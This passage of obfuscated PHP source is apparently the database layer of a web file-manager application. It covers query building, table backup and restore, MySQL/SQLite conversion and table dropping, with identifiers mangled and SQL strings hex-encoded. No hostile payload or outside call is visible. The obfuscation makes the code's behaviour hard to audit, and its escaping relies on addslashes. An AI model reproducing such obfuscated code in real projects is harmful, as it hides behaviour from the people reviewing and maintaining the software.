$»¢òîÔË[1068], $ÆÙìø±–); return $ÆÙìø±–; } protected function parseOrder($ÖŠŠ°‰ú) { $«Á—äö =& $_SERVER[•€áå–Õ]; if (is_array($ÖŠŠ°‰ú)) { $ûºˆ§ = array(); foreach ($ÖŠŠ°‰ú as $Ëá í«¬ => $ëíñãŞñ) { if (is_numeric($Ëá í«¬)) { $ûºˆ§[] = $this->parseKey($ëíñãŞñ); } else { $ëíñãŞñ = in_array(strtoupper(trim($ëíñãŞñ)), array($«Á—äö[1069], $«Á—äö[1070])) ? $«Á—äö[63] . $ëíñãŞñ : $«Á—äö[22]; if (preg_match($«Á—äö[1071], $Ëá í«¬)) { $ûºˆ§[] = $this->parseKey($Ëá í«¬) . $ëíñãŞñ; } else { think_exception($«Á—äö[1072] . $Ëá í«¬); } } } $ÖŠŠ°‰ú = implode($«Á—äö[60], $ûºˆ§); } return !empty($ÖŠŠ°‰ú) ? $«Á—äö[1073] . $ÖŠŠ°‰ú : $«Á—äö[22]; } protected function parseGroup($«ı«±»×) { $£Ì€¶â =& $_SERVER[•€áå–Õ]; return !empty($«ı«±»×) ? $£Ì€¶â[1074] . $«ı«±»× : $£Ì€¶â[22]; } protected function parseHaving($ŠËş€Ñì) { $Í´ÚÔ =& $_SERVER[•€áå–Õ]; return !empty($ŠËş€Ñì) ? $Í´ÚÔ[1075] . $ŠËş€Ñì : $Í´ÚÔ[22]; } protected function parseComment($“ÒÏã×¡) { $¡ØĞ¸İ =& $_SERVER[•€áå–Õ]; return !empty($“ÒÏã×¡) ? $¡ØĞ¸İ[1076] . $“ÒÏã×¡ . $¡ØĞ¸İ[1077] : $¡ØĞ¸İ[22]; } protected function parseDistinct($«ËÂ„±¯) { $¬ı„¹Üõ =& $_SERVER[•€áå–Õ]; return !empty($«ËÂ„±¯) ? $¬ı„¹Üõ[1078] : $¬ı„¹Üõ[22]; } protected function parseUnion($˜¨—¹‘×) { $›•ò‘Öï =& $_SERVER[•€áå–Õ]; if (empty($˜¨—¹‘×)) { return $›•ò‘Öï[22]; } if (isset($˜¨—¹‘×[$›•ò‘Öï[403]])) { $Ó”ÒˆÃš = $›•ò‘Öï[1079]; unset($˜¨—¹‘×[$›•ò‘Öï[403]]); } else { $Ó”ÒˆÃš = $›•ò‘Öï[1080]; } foreach ($˜¨—¹‘× as $¨ÒÜË·±) { $Èİ Ó‚ø[] = $Ó”ÒˆÃš . (is_array($¨ÒÜË·±) ? $this->buildSelectSql($¨ÒÜË·±) : $¨ÒÜË·±); } return implode($›•ò‘Öï[63], $Èİ Ó‚ø); } public function insert($±ŒÂóı, $ŞÁŠöç = array(), $—°ÜÏôé = false) { $î¦²˜Ô¼ =& $_SERVER[•€áå–Õ]; $°ãÊøœç = $É³‰æÏ‡ = array(); $this->model = $ŞÁŠöç[$î¦²˜Ô¼[336]]; foreach ($±ŒÂóı as $­ˆ·‚Ó => $îŒÀú) { if (is_array($îŒÀú) && $î¦²˜Ô¼[352] == $îŒÀú[0]) { $É³‰æÏ‡[] = $this->parseKey($­ˆ·‚Ó); $°ãÊøœç[] = $îŒÀú[1]; } elseif (is_scalar($îŒÀú) || is_null($îŒÀú)) { $É³‰æÏ‡[] = $this->parseKey($­ˆ·‚Ó); $°ãÊøœç[] = $this->parseValue($îŒÀú); } } $ë‰ÍÜŞë = ($—°ÜÏôé ? $î¦²˜Ô¼[948] : $î¦²˜Ô¼[949]) . $î¦²˜Ô¼[950] . $this->parseTable($ŞÁŠöç[$î¦²˜Ô¼[334]]) . $î¦²˜Ô¼[944] . implode($î¦²˜Ô¼[60], $É³‰æÏ‡) . $î¦²˜Ô¼[945] . implode($î¦²˜Ô¼[60], $°ãÊøœç) . $î¦²˜Ô¼[946]; $ë‰ÍÜŞë .= $this->parseLock(isset($ŞÁŠöç[$î¦²˜Ô¼[885]]) ? $ŞÁŠöç[$î¦²˜Ô¼[885]] : !1); $ë‰ÍÜŞë .= $this->parseComment(!empty($ŞÁŠöç[$î¦²˜Ô¼[409]]) ? $ŞÁŠöç[$î¦²˜Ô¼[409]] : $î¦²˜Ô¼[22]); return $this->execute($ë‰ÍÜŞë, $this->parseBind(!empty($ŞÁŠöç[$î¦²˜Ô¼[340]]) ? $ŞÁŠöç[$î¦²˜Ô¼[340]] : array())); } public function selectInsert($¶úøà¢, $…ìÌ¸ÒŠ, $â²ËÏˆó = array()) { $¯ĞªÀãï =& $_SERVER[•€áå–Õ]; $this->model = $â²ËÏˆó[$¯ĞªÀãï[336]]; if (is_string($¶úøà¢)) { $¶úøà¢ = explode($¯ĞªÀãï[60], $¶úøà¢); } array_walk($¶úøà¢, array($this, $¯ĞªÀãï[947])); $ëÍ½Ì‡ = $¯ĞªÀãï[1081] . $this->parseTable($…ìÌ¸ÒŠ) . $¯ĞªÀãï[944] . implode($¯ĞªÀãï[60], $¶úøà¢) . $¯ĞªÀãï[1059]; $ëÍ½Ì‡ .= $this->buildSelectSql($â²ËÏˆó); return $this->execute($ëÍ½Ì‡, $this->parseBind(!empty($â²ËÏˆó[$¯ĞªÀãï[340]]) ? $â²ËÏˆó[$¯ĞªÀãï[340]] : array())); } public function update($ßµ‰˜ÌÜ, $ö–óıÈ‡) { $ÑäÑïÆø =& $_SERVER[•€áå–Õ]; $this->model = $ö–óıÈ‡[$ÑäÑïÆø[336]]; $‘Ê¼Œ½ = $ÑäÑïÆø[1082] . $this->parseTable($ö–óıÈ‡[$ÑäÑïÆø[334]]) . $this->parseSet($ßµ‰˜ÌÜ) . $this->parseWhere(!empty($ö–óıÈ‡[$ÑäÑïÆø[330]]) ? $ö–óıÈ‡[$ÑäÑïÆø[330]] : $ÑäÑïÆø[22]) . $this->parseOrder(!empty($ö–óıÈ‡[$ÑäÑïÆø[420]]) ? $ö–óıÈ‡[$ÑäÑïÆø[420]] : $ÑäÑïÆø[22]) . $this->parseLimit(!empty($ö–óıÈ‡[$ÑäÑïÆø[347]]) ? $ö–óıÈ‡[$ÑäÑïÆø[347]] : $ÑäÑïÆø[22]) . $this->parseLock(isset($ö–óıÈ‡[$ÑäÑïÆø[885]]) ? $ö–óıÈ‡[$ÑäÑïÆø[885]] : !1) . $this->parseComment(!empty($ö–óıÈ‡[$ÑäÑïÆø[409]]) ? $ö–óıÈ‡[$ÑäÑïÆø[409]] : $ÑäÑïÆø[22]); return $this->execute($‘Ê¼Œ½, $this->parseBind(!empty($ö–óıÈ‡[$ÑäÑïÆø[340]]) ? $ö–óıÈ‡[$ÑäÑïÆø[340]] : array())); } public function delete($ƒÅô—µÑ = array()) { $œ×Î—Ë =& $_SERVER[•€áå–Õ]; $this->model = $ƒÅô—µÑ[$œ×Î—Ë[336]]; $¤Ù»¦‹ = $œ×Î—Ë[1083] . $this->parseTable($ƒÅô—µÑ[$œ×Î—Ë[334]]) . $this->parseWhere(!empty($ƒÅô—µÑ[$œ×Î—Ë[330]]) ? $ƒÅô—µÑ[$œ×Î—Ë[330]] : $œ×Î—Ë[22]) . $this->parseOrder(!empty($ƒÅô—µÑ[$œ×Î—Ë[420]]) ? $ƒÅô—µÑ[$œ×Î—Ë[420]] : $œ×Î—Ë[22]) . $this->parseLimit(!empty($ƒÅô—µÑ[$œ×Î—Ë[347]]) ? $ƒÅô—µÑ[$œ×Î—Ë[347]] : $œ×Î—Ë[22]) . $this->parseLock(isset($ƒÅô—µÑ[$œ×Î—Ë[885]]) ? $ƒÅô—µÑ[$œ×Î—Ë[885]] : !1) . $this->parseComment(!empty($ƒÅô—µÑ[$œ×Î—Ë[409]]) ? $ƒÅô—µÑ[$œ×Î—Ë[409]] : $œ×Î—Ë[22]); return $this->execute($¤Ù»¦‹, $this->parseBind(!empty($ƒÅô—µÑ[$œ×Î—Ë[340]]) ? $ƒÅô—µÑ[$œ×Î—Ë[340]] : array())); } public function select($ëƒœ¯‡¨ = array()) { $Ä¯¹†˜‰ =& $_SERVER[•€áå–Õ]; $this->model = $ëƒœ¯‡¨[$Ä¯¹†˜‰[336]]; $šÎ–æ´‘ = $this->buildSelectSql($ëƒœ¯‡¨); $·Ü‚ñ = isset($ëƒœ¯‡¨[$Ä¯¹†˜‰[404]]) ? $ëƒœ¯‡¨[$Ä¯¹†˜‰[404]] : !1; if ($·Ü‚ñ) { $ë¨ÔÇ™å = is_string($·Ü‚ñ[$Ä¯¹†˜‰[106]]) ? $·Ü‚ñ[$Ä¯¹†˜‰[106]] : $Ä¯¹†˜‰[1084] . md5($šÎ–æ´‘); $©¯€Ì = think_cache($ë¨ÔÇ™å, $Ä¯¹†˜‰[22], $·Ü‚ñ); if (!1 !== $©¯€Ì) { return $©¯€Ì; } } $…û¢½À = $this->query($šÎ–æ´‘, $this->parseBind(!empty($ëƒœ¯‡¨[$Ä¯¹†˜‰[340]]) ? $ëƒœ¯‡¨[$Ä¯¹†˜‰[340]] : array())); if ($·Ü‚ñ && !1 !== $…û¢½À) { think_cache($ë¨ÔÇ™å, $…û¢½À, $·Ü‚ñ); } return $…û¢½À; } public function buildSelectSql($é«“ûÔá = array()) { $ÃîØœŠ =& $_SERVER[•€áå–Õ]; if (isset($é«“ûÔá[$ÃîØœŠ[408]])) { if (strpos($é«“ûÔá[$ÃîØœŠ[408]], $ÃîØœŠ[60])) { list($²úÄìıĞ, $Ü³ç¢İ ) = explode($ÃîØœŠ[60], $é«“ûÔá[$ÃîØœŠ[408]]); } else { $²úÄìıĞ = $é«“ûÔá[$ÃîØœŠ[408]]; } $²úÄìıĞ = $²úÄìıĞ ? $²úÄìıĞ : 1; $Ü³ç¢İ  = isset($Ü³ç¢İ ) ? $Ü³ç¢İ  : (is_numeric($é«“ûÔá[$ÃîØœŠ[347]]) ? $é«“ûÔá[$ÃîØœŠ[347]] : 20); $•ŠıÎ£Ë = $Ü³ç¢İ  * ((int) $²úÄìıĞ - 1); $é«“ûÔá[$ÃîØœŠ[347]] = $•ŠıÎ£Ë . $ÃîØœŠ[60] . $Ü³ç¢İ ; } if (think_config($ÃîØœŠ[1085])) { $¾İ…ó×› = $ÃîØœŠ[1086] . md5(serialize($é«“ûÔá)); $Ï™·è’š = think_cache($¾İ…ó×›); if ($Ï™·è’š) { return $Ï™·è’š; } } $³æ„ª· = $this->parseSql($this->selectSql, $é«“ûÔá); $³æ„ª· .= $this->parseLock(isset($é«“ûÔá[$ÃîØœŠ[885]]) ? $é«“ûÔá[$ÃîØœŠ[885]] : !1); if (isset($¾İ…ó×›)) { think_cache($¾İ…ó×›, $³æ„ª·); } return $³æ„ª·; } public function parseSql($‹ú“ğá, $öÄê‰ä– = array()) { $êÖÅª¨ˆ =& $_SERVER[•€áå–Õ]; $‹ú“ğá = str_replace(array($êÖÅª¨ˆ[1087], $êÖÅª¨ˆ[1088], $êÖÅª¨ˆ[1089], $êÖÅª¨ˆ[1090], $êÖÅª¨ˆ[1091], $êÖÅª¨ˆ[1092], $êÖÅª¨ˆ[1093], $êÖÅª¨ˆ[1094], $êÖÅª¨ˆ[1095], $êÖÅª¨ˆ[1096], $êÖÅª¨ˆ[1097]), array($this->parseTable("{$öÄê‰ä–[$êÖÅª¨ˆ[334]]}"), $this->parseDistinct(isset($öÄê‰ä–[$êÖÅª¨ˆ[1098]]) ? $öÄê‰ä–[$êÖÅª¨ˆ[1098]] : !1), $this->parseField(!empty($öÄê‰ä–[$êÖÅª¨ˆ[328]]) ? $öÄê‰ä–[$êÖÅª¨ˆ[328]] : $êÖÅª¨ˆ[215]), $this->parseJoin(!empty($öÄê‰ä–[$êÖÅª¨ˆ[337]]) ? $öÄê‰ä–[$êÖÅª¨ˆ[337]] : $êÖÅª¨ˆ[22]), $this->parseWhere(!empty($öÄê‰ä–[$êÖÅª¨ˆ[330]]) ? $öÄê‰ä–[$êÖÅª¨ˆ[330]] : $êÖÅª¨ˆ[22]), $this->parseGroup(!empty($öÄê‰ä–[$êÖÅª¨ˆ[558]]) ? $öÄê‰ä–[$êÖÅª¨ˆ[558]] : $êÖÅª¨ˆ[22]), $this->parseHaving(!empty($öÄê‰ä–[$êÖÅª¨ˆ[1099]]) ? $öÄê‰ä–[$êÖÅª¨ˆ[1099]] : $êÖÅª¨ˆ[22]), $this->parseOrder(!empty($öÄê‰ä–[$êÖÅª¨ˆ[420]]) ? $öÄê‰ä–[$êÖÅª¨ˆ[420]] : $êÖÅª¨ˆ[22]), $this->parseLimit(!empty($öÄê‰ä–[$êÖÅª¨ˆ[347]]) ? $öÄê‰ä–[$êÖÅª¨ˆ[347]] : $êÖÅª¨ˆ[22]), $this->parseUnion(!empty($öÄê‰ä–[$êÖÅª¨ˆ[402]]) ? $öÄê‰ä–[$êÖÅª¨ˆ[402]] : $êÖÅª¨ˆ[22]), $this->parseComment(!empty($öÄê‰ä–[$êÖÅª¨ˆ[409]]) ? $öÄê‰ä–[$êÖÅª¨ˆ[409]] : $êÖÅª¨ˆ[22])), $‹ú“ğá); return $‹ú“ğá; } public function getLastSql($Ì€Âç­É = '') { return $Ì€Âç­É ? $this->modelSql[$Ì€Âç­É] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ë²ê§œ¼) { return addslashes($ë²ê§œ¼); } public function setModel($„·°•öÊ) { $this->model = $„·°•öÊ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($îè¢·Õ = array()) { $Æ½²›¢‰ =& $_SERVER[•€áå–Õ]; if (empty($îè¢·Õ)) { $îè¢·Õ = $GLOBALS[$Æ½²›¢‰[16]][$Æ½²›¢‰[31]]; } $this->database = $îè¢·Õ; } public function model($ÇäœÌÒ† = '') { return new ModelBase($ÇäœÌÒ†, $_SERVER[•€áå–Õ][22], $this->database); } public function db($ˆù§¶ªç = false) { $®êÅÀ =& $_SERVER[•€áå–Õ]; $´ùÜ‚Ğå = array_change_key_case($this->database); if ($this->dbType() == $®êÅÀ[23] || !$ˆù§¶ªç) { return $this->model()->db(); } $ê¹½ÙÒ = $´ùÜ‚Ğå[$®êÅÀ[1013]]; $´ùÜ‚Ğå[$®êÅÀ[1013]] = $®êÅÀ[22]; if ($´ùÜ‚Ğå[$®êÅÀ[1008]] == $®êÅÀ[1005]) { $ê¿ò×¡¨ = $´ùÜ‚Ğå[$®êÅÀ[1014]]; $´ùÜ‚Ğå[$®êÅÀ[1014]] = substr($ê¿ò×¡¨, 0, strrpos($ê¿ò×¡¨, $®êÅÀ[1100])); } $this->database = $´ùÜ‚Ğå; $’…“¤ = $this->model()->db(); try { $À×¾¡üì = $’…“¤->execute("\x73\150\x6f\167\x20\144\x61\x74\x61\x62\141\163\145\x73\40\x6c\x69\153\145\x20\47{$ê¹½ÙÒ}\x27"); } catch (Exception $ÂÊÈùçœ) { } if (!$À×¾¡üì) { $’…“¤->execute("\143\x72\145\x61\x74\x65\40\x64\141\164\x61\x62\141\163\145\x20\x60{$ê¹½ÙÒ}\140"); } $´ùÜ‚Ğå[$®êÅÀ[1013]] = $ê¹½ÙÒ; if ($´ùÜ‚Ğå[$®êÅÀ[1008]] == $®êÅÀ[1005]) { $´ùÜ‚Ğå[$®êÅÀ[1014]] .= $®êÅÀ[1100] . $ê¹½ÙÒ; } $this->database = $´ùÜ‚Ğå; $’…“¤->execute("\x75\163\x65\x20\x60{$ê¹½ÙÒ}\x60"); return $’…“¤; } public function createTable($ÊµŒüÁ, &$è§¼û‡…) { $ØŞœøª« =& $_SERVER[•€áå–Õ]; if (!IO::exist($ÊµŒüÁ)) { ActionCall($ØŞœøª«[1101], !0, 0); show_json(LNG($ØŞœøª«[1102]), !1); } $ª‰ºÇ¹ş = $this->model()->db(); $ìÕ¿ÜÂİ = sqlSplit(IO::getContent($ÊµŒüÁ)); foreach ($ìÕ¿ÜÂİ as $ÎÈ—ˆ†) { $·”º¿ª = stripos($ÎÈ—ˆ†, $ØŞœøª«[1103]) === 0; if ($·”º¿ª) { $è§¼û‡…->task[$ØŞœøª«[827]] += 1; } $ª‰ºÇ¹ş->execute($ÎÈ—ˆ†); if ($·”º¿ª) { preg_match($ØŞœøª«[1104], $ÎÈ—ˆ†, $²ÍúÂºÊ); $è§¼û‡…->task[$ØŞœøª«[1105]] = $²ÍúÂºÊ[1]; $è§¼û‡…->update(1); } } } public function insertTable($¥ğÆÈ’Ú, &$‹Óñ¼˜À) { $¾•óÏÎ =& $_SERVER[•€áå–Õ]; $çà£Áº„ = $this->model()->db(); $ù× Ë° = $•ïÉ² ? array($•ïÉ²) : $çà£Áº„->getTables(); foreach ($¥ğÆÈ’Ú as $Ş±µ·Ç¬) { $•ïÉ² = basename($Ş±µ·Ç¬, $¾•óÏÎ[829]); if (!in_array($•ïÉ², $ù× Ë°)) { continue; } $‹Óñ¼˜À->task[$¾•óÏÎ[1105]] = $•ïÉ²; if (get_filesize($Ş±µ·Ç¬) == 0) { continue; } $±“Ï×‚² = $this->sqlToDb($Ş±µ·Ç¬, $‹Óñ¼˜À); if (!$±“Ï×‚²) { ActionCall($¾•óÏÎ[1101], !0, 0); show_json(LNG($¾•óÏÎ[1106]) . "\133{$•ïÉ²}\135", !1); } } } public function sqlFromDb($Ûöß”ˆ„, $åÍÒ–Ÿš, &$î€ØøóÁ, $Æ¯ØÆÜ = '') { if ($î€ØøóÁ) { $î€ØøóÁ->task[$_SERVER[•€áå–Õ][1105]] = $Ûöß”ˆ„; } $Ëóşó˜ç = $this->model($Ûöß”ˆ„); $”±Øëœ’ = 0; $õÌ‚ôºˆ = 0; $–±ƒŞ = 10000; $°¥•š†è = fopen($åÍÒ–Ÿš, $_SERVER[•€áå–Õ][1107]); $ğïşÕÙî = $Ëóşó˜ç->getPk(); $ù”Ô„ü¥ = $Ëóşó˜ç->getDbFields(); $’÷ÊÒÉÆ = $_SERVER[•€áå–Õ][22]; if ($GLOBALS[$_SERVER[•€áå–Õ][828]] && in_array($Ûöß”ˆ„, array($_SERVER[•€áå–Õ][1108], $_SERVER[•€áå–Õ][1109]))) { $’÷ÊÒÉÆ = $Ûöß”ˆ„; } do { $¿ŞÆúó§ = array($ğïşÕÙî => array($_SERVER[•€áå–Õ][1055], $õÌ‚ôºˆ)); $¯ÖÅ“©Ê = $Ëóşó˜ç->where($¿ŞÆúó§)->field($ù”Ô„ü¥)->order($ğïşÕÙî . $_SERVER[•€áå–Õ][1110])->limit($–±ƒŞ)->select(); $¯ÖÅ“©Ê = !empty($¯ÖÅ“©Ê) ? $¯ÖÅ“©Ê : array(); if (!($âè¨”ÁÁ = count($¯ÖÅ“©Ê))) { break; } $ôİ¡ÜŠç = end($¯ÖÅ“©Ê); $õÌ‚ôºˆ = $ôİ¡ÜŠç[$ğïşÕÙî]; $ÄÒö‡ = array(); foreach ($¯ÖÅ“©Ê as $ò€ğëú) { if ($’÷ÊÒÉÆ) { if ($Ûöß”ˆ„ == $_SERVER[•€áå–Õ][1108]) { if ($ò€ğëú[$_SERVER[•€áå–Õ][43]] == $_SERVER[•€áå–Õ][1111]) { $›ËŒ¯Üı = json_decode($ò€ğëú[$_SERVER[•€áå–Õ][429]], !0); if ($›ËŒ¯Üı[$_SERVER[•€áå–Õ][42]] == $GLOBALS[$_SERVER[•€áå–Õ][828]] && $›ËŒ¯Üı[$_SERVER[•€áå–Õ][791]] != 1) { continue; } } } else { if ($ò€ğëú[$_SERVER[•€áå–Õ][43]] == $_SERVER[•€áå–Õ][1112] && $ò€ğëú[$_SERVER[•€áå–Õ][106]] == $_SERVER[•€áå–Õ][820]) { continue; } } } if ($Æ¯ØÆÜ) { $ò€ğëú[$_SERVER[•€áå–Õ][96]] = "\x7b\151\157\x3a{$Æ¯ØÆÜ}\x7d" . substr($ò€ğëú[$_SERVER[•€áå–Õ][96]], strlen("\173\x69\157\72{$ò€ğëú[$_SERVER[•€áå–Õ][858]]}\x7d")); $ò€ğëú[$_SERVER[•€áå–Õ][858]] = $Æ¯ØÆÜ; } $ÄÒö‡[] = $_SERVER[•€áå–Õ][1113] . $this->sqlEncode($ò€ğëú) . $_SERVER[•€áå–Õ][1114]; } $Õ¢ª’›‡ = "\111\116\123\105\122\124\x20\x49\116\x54\x4f\40\140{$Ûöß”ˆ„}\140\x20\x28\140" . implode($_SERVER[•€áå–Õ][1115], $ù”Ô„ü¥) . $_SERVER[•€áå–Õ][1116]; fwrite($°¥•š†è, $Õ¢ª’›‡ . implode($_SERVER[•€áå–Õ][1117], $ÄÒö‡) . $_SERVER[•€áå–Õ][83] . PHP_EOL); $”±Øëœ’ += $âè¨”ÁÁ; if ($î€ØøóÁ) { $î€ØøóÁ->update($âè¨”ÁÁ); } } while ($–±ƒŞ == $âè¨”ÁÁ); fclose($°¥•š†è); return $”±Øëœ’; } public function sqlToDb($³è‹éàã, &$®âÉïËÊ) { $³Ğ‘ŒÂÀ =& $_SERVER[•€áå–Õ]; $®öĞÈ„İ = $this->model()->db(); $€Ù‰ÄíÅ = @fopen($³è‹éàã, $³Ğ‘ŒÂÀ[1118]); if (!$€Ù‰ÄíÅ) { return !1; } $°ûƒ¡Üû = 0; $Ğ¢Ùíš¸ = $³Ğ‘ŒÂÀ[22]; $ËÕ«Îû¤ = array(); $‰¦§à‹ = $this->dbType(); $¹ÃÑœÏË = $‰¦§à‹ == $³Ğ‘ŒÂÀ[23] ? 500 : 2000; $ø™ø÷ù = basename($³è‹éàã, $³Ğ‘ŒÂÀ[829]); $ÛïÆ¹è€ = 0; $¶ƒ¬éä‹ = 4194304 - 104858; $ıØµğÀê = 1000000 - 104858; while (!feof($€Ù‰ÄíÅ)) { $¸¬·Ø³ó = trim(fgets($€Ù‰ÄíÅ)); if (!$¸¬·Ø³ó) { continue; } $Âıíêó“ = $this->sqlDecode($¸¬·Ø³ó, $‰¦§à‹, $ø™ø÷ù); if (stripos($Âıíêó“, $³Ğ‘ŒÂÀ[410]) === 0) { if (!$Ğ¢Ùíš¸) { $Ğ¢Ùíš¸ = $Âıíêó“ . $³Ğ‘ŒÂÀ[63]; } continue; } if ($®âÉïËÊ) { $®âÉïËÊ->task[$³Ğ‘ŒÂÀ[827]] += 1; } $°ûƒ¡Üû++; $ËÕ«Îû¤[] = rtrim(rtrim(trim($Âıíêó“), $³Ğ‘ŒÂÀ[60]), $³Ğ‘ŒÂÀ[83]); $óÔ˜Ã±Ü = null; $ú³¼ôÒü = strlen($Âıíêó“); $ÛïÆ¹è€ += $ú³¼ôÒü; if ($ÛïÆ¹è€ >= ($¹ÃÑœÏË == 500 ? $ıØµğÀê : $¶ƒ¬éä‹)) { $óÔ˜Ã±Ü = array_pop($ËÕ«Îû¤); if ($°ûƒ¡Üû > 1) { $°ûƒ¡Üû--; } } if ($°ûƒ¡Üû >= $¹ÃÑœÏË || $óÔ˜Ã±Ü) { $Âıíêó“ = $Ğ¢Ùíš¸ . implode($³Ğ‘ŒÂÀ[60], $ËÕ«Îû¤); if (!$®öĞÈ„İ->execute($Âıíêó“)) { return !1; } if ($®âÉïËÊ) { $®âÉïËÊ->update($°ûƒ¡Üû); } $ËÕ«Îû¤ = array(); $°ûƒ¡Üû = 0; $ÛïÆ¹è€ = 0; if ($óÔ˜Ã±Ü) { $ËÕ«Îû¤ = array($óÔ˜Ã±Ü); $°ûƒ¡Üû = 1; $ÛïÆ¹è€ = $ú³¼ôÒü; } } } fclose($€Ù‰ÄíÅ); if (!empty($ËÕ«Îû¤)) { $Âıíêó“ = $Ğ¢Ùíš¸ . implode($³Ğ‘ŒÂÀ[60], $ËÕ«Îû¤); if (!$®öĞÈ„İ->execute($Âıíêó“)) { return !1; } if ($®âÉïËÊ) { $®âÉïËÊ->update($°ûƒ¡Üû); } } return !0; } public function dropTable($ºÆ»ÜÏÖ = null) { $ƒÂ§ºî± = $this->model()->db(); $©şš¸µÂ = $ºÆ»ÜÏÖ ? array($ºÆ»ÜÏÖ) : $ƒÂ§ºî±->getTables(); if (!$©şš¸µÂ) { return; } foreach ($©şš¸µÂ as $ºÆ»ÜÏÖ) { if ($ºÆ»ÜÏÖ) { $ºÆ»ÜÏÖ = strtolower($ºÆ»ÜÏÖ); } else { continue; } $ƒÂ§ºî±->execute("\x64\x72\157\x70\x20\x74\141\142\154\x65\40\151\146\x20\x65\170\151\x73\164\x73\x20\140{$ºÆ»ÜÏÖ}\x60"); } } private function sqlEncode($´›†ñÙ—) { $Ôšª©•Ó =& $_SERVER[•€áå–Õ]; $¬ò³Œ = array(); foreach ($´›†ñÙ— as $•ı©‡Œ©) { if (is_array($•ı©‡Œ©)) { $•ı©‡Œ© = json_encode_force($•ı©‡Œ©); } $•ı©‡Œ© = addslashes($•ı©‡Œ©); $•ı©‡Œ© = str_replace(array($Ôšª©•Ó[1119], $Ôšª©•Ó[12]), array($Ôšª©•Ó[1120], $Ôšª©•Ó[1121]), $•ı©‡Œ©); $¬ò³Œ[] = str_replace($Ôšª©•Ó[68], $Ôšª©•Ó[1122], $•ı©‡Œ©); } return $Ôšª©•Ó[68] . implode($Ôšª©•Ó[1123], $¬ò³Œ) . $Ôšª©•Ó[68]; } private function sqlDecode($¿”§İ¿”, $š ÷‰Ÿó, $»â£´æ³ = '') { $‘ó“¥œÛ =& $_SERVER[•€áå–Õ]; $¿”§İ¿” = str_replace(array($‘ó“¥œÛ[1120], $‘ó“¥œÛ[1121]), array($‘ó“¥œÛ[1119], $‘ó“¥œÛ[12]), $¿”§İ¿”); if ($š ÷‰Ÿó == $‘ó“¥œÛ[23]) { return $»â£´æ³ != $‘ó“¥œÛ[1124] ? stripslashes($¿”§İ¿”) : $¿”§İ¿”; } if ($»â£´æ³ == $‘ó“¥œÛ[1124]) { $¿”§İ¿” = str_replace($‘ó“¥œÛ[1125], $‘ó“¥œÛ[130], stripslashes($¿”§İ¿”)); } return $¿”§İ¿”; } public function getSqlFile($ôæëë¡ = '') { $˜ÒëÓ‘¯ =& $_SERVER[•€áå–Õ]; $Èˆ˜¿â¿ = $this->dbType(!0); $Ë±Œİš© = CONTROLLER_DIR . "\151\x6e\163\x74\x61\x6c\154\57\x64\x61\164\141\x2f{$Èˆ˜¿â¿}\56\163\x71\154"; $‚©ØÏ¶ı = file_get_contents($Ë±Œİš©); $›éî‰¹» = $˜ÒëÓ‘¯[1126] . ($Èˆ˜¿â¿ == $˜ÒëÓ‘¯[845] ? $˜ÒëÓ‘¯[1127] : $˜ÒëÓ‘¯[1128]) . $˜ÒëÓ‘¯[1129]; preg_match_all($›éî‰¹», $‚©ØÏ¶ı, $òÑ£åÌ); $È–È¾— = $òÑ£åÌ[1]; $ô˜¬Ù×Ë = $this->model()->db(); $ÅÚ™™ÂÅ = $ô˜¬Ù×Ë->getTables(); $¼™¿Ó = TEMP_FILES . $˜ÒëÓ‘¯[1130] . date($˜ÒëÓ‘¯[266]) . $˜ÒëÓ‘¯[18]; del_dir($¼™¿Ó); mk_dir($¼™¿Ó); $¤”Ñ‹¨† = $¼™¿Ó . $˜ÒëÓ‘¯[1131]; $ç–ğğ¾ù = $¼™¿Ó . $˜ÒëÓ‘¯[1132]; $¼¡çó´ã = $Èˆ˜¿â¿ == $˜ÒëÓ‘¯[23] ? $˜ÒëÓ‘¯[845] : $˜ÒëÓ‘¯[23]; IO::copy(CONTROLLER_DIR . "\151\156\x73\x74\141\154\x6c\x2f\144\x61\x74\x61\57{$¼¡çó´ã}\56\x73\x71\x6c", $¼™¿Ó); @touch($¼™¿Ó . $Èˆ˜¿â¿ . $˜ÒëÓ‘¯[829]); $û‘¥íÖ = fopen($¤”Ñ‹¨†, $˜ÒëÓ‘¯[1107]); $ÏëÓÈªİ = fopen($ç–ğğ¾ù, $˜ÒëÓ‘¯[1107]); if ($Èˆ˜¿â¿ == $˜ÒëÓ‘¯[23]) { $ÅÚ™™ÂÅ = array_diff($ÅÚ™™ÂÅ, array($˜ÒëÓ‘¯[825], $˜ÒëÓ‘¯[826])); $³€ø™ıÎ = array($˜ÒëÓ‘¯[1133], $˜ÒëÓ‘¯[1134], $˜ÒëÓ‘¯[1135]); fwrite($ÏëÓÈªİ, implode(PHP_EOL, $³€ø™ıÎ) . PHP_EOL . PHP_EOL); foreach ($ÅÚ™™ÂÅ as $Ä–îÀäÀ) { $Ñ°Àºè÷ = $this->sqlFromSqlite($Ä–îÀäÀ); if (!$Ñ°Àºè÷[$˜ÒëÓ‘¯[23]]) { continue; } fwrite($ÏëÓÈªİ, $Ñ°Àºè÷[$˜ÒëÓ‘¯[23]] . PHP_EOL . PHP_EOL); if (!in_array($Ä–îÀäÀ, $È–È¾—)) { fwrite($û‘¥íÖ, $Ñ°Àºè÷[$˜ÒëÓ‘¯[845]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ÅÚ™™ÂÅ as $Ä–îÀäÀ) { $Ñ°Àºè÷ = $this->sqlFromMysql($Ä–îÀäÀ); if (!$Ñ°Àºè÷[$˜ÒëÓ‘¯[845]]) { continue; } fwrite($û‘¥íÖ, $Ñ°Àºè÷[$˜ÒëÓ‘¯[845]] . PHP_EOL . PHP_EOL); if (!in_array($Ä–îÀäÀ, $È–È¾—)) { fwrite($ÏëÓÈªİ, $Ñ°Àºè÷[$˜ÒëÓ‘¯[23]] . PHP_EOL . PHP_EOL); } } } fclose($û‘¥íÖ); fclose($ÏëÓÈªİ); $‚©ØÏ¶ı = array($˜ÒëÓ‘¯[845] => $¤”Ñ‹¨†, $˜ÒëÓ‘¯[23] => $ç–ğğ¾ù); return $ôæëë¡ ? $‚©ØÏ¶ı[$ôæëë¡] : $‚©ØÏ¶ı; } public function dbType($ÆŞÌ¿¬¤ = false) { $Şı‡Ö²à =& $_SERVER[•€áå–Õ]; $Îğ°¯™å = $ÆŞÌ¿¬¤ ? $GLOBALS[$Şı‡Ö²à[16]][$Şı‡Ö²à[31]] : $this->database; $Îğ°¯™å = 